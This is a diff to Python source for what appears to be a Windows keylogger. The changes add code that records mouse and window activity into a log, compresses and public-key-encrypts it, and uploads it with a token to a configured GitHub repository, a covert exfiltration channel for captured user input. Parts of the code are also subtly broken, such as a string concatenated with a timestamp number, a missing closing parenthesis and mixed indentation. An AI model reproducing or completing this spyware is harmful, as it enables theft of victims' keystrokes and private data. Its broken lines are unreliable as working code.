@@ -17,7 +17,12 @@ from github3 import login
 #kernel32 = windll.kernel32
 #psapi = windll.psapi
 current_window = None
-log = StringIO.StringIO()
+
+def init_strio():
+	global log
+	log = StringIO.StringIO()
+	log.write("winkeylog at " + time.time())
+	return
 
 def check_window(event):
 	global log
@@ -62,9 +67,27 @@ def MouseRight(event):
 	log.write("Right mouse: " + str(event.Position) + " ")
 	return True
 
-def push_data(config):
-	#todo
+def push_data(config): #need to sub in random identifiers
+	global log
+	gh = login(token = config.g_token())
+	repo = gh.repository(config.g_usr(), config.g_repo())
+	repo.create_file(config.g_data(), config.g_com(), encrypt(log.getvalue(), 
+									config)
+	log.close()
+	init_strio()
 	return
+
+def encrypt(data, config):
+	key = config.pk
+        size = config.siz
+        offset = 0
+        encrypted = ""
+        compressed = zlib.compress(data)
+        while offset < len(compressed):
+                chunk = compressed[offset:offset+size]
+                encrypted += key.encrypt(chunk)
+                offset += size
+        return base64.b64encode(encrypted)
 
 def run(config, **args):
 	global log
